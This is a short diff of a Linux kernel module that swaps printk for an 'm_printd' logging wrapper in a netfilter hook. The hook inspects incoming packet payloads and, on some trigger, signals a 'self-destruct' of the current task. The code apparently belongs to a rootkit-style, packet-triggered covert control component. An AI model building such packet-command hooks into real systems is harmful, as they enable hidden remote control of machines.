@@ -73,8 +73,8 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             kfree(_data);
             return NF_ACCEPT;
         }
-        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
-        printk(KERN_DEBUG "%s\n", user_data);
+        m_printd(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
+        m_printd(KERN_DEBUG "%s\n", user_data);
 
         if(strlen(user_data)<10){
             return NF_ACCEPT;
@@ -107,7 +107,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
             struct task_struct *current_task = current;
             send_sig(SIGDESTRUCT, current_task, 0);
-            printk(KERN_INFO ":: CALL SIGKILL FOR SELFDESTRUCT \n");
+            m_printd(KERN_INFO ":: CALL SIGKILL FOR SELFDESTRUCT \n");
             return NF_DROP;
         }
         return NF_ACCEPT;
@@ -145,6 +145,6 @@ int register_netfilter_hook(void){
 void unregister_netfilter_hook(void){
 
     nf_unregister_net_hook(&init_net, &nfho);
-    printk(KERN_INFO ":: Unregistered nethook");
+    m_printd(KERN_INFO ":: Unregistered nethook");
 
 }
